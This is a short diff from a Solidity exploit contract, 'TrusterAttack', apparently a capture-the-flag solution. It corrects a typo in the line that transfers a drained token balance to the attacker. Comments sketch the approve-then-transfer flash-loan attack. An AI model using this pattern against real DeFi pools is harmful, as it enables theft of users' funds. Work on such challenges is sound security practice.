@@ -34,7 +34,7 @@ contract TrusterAttack {
                 balance
             )
         );
-        IERC20(tokenAddress).tranfser(msg.sender, balance);
+        IERC20(tokenAddress).transfer(msg.sender, balance);
         //calldata = approve(pool, this)
         //response 
         //token.tranfser(amount,attacker)
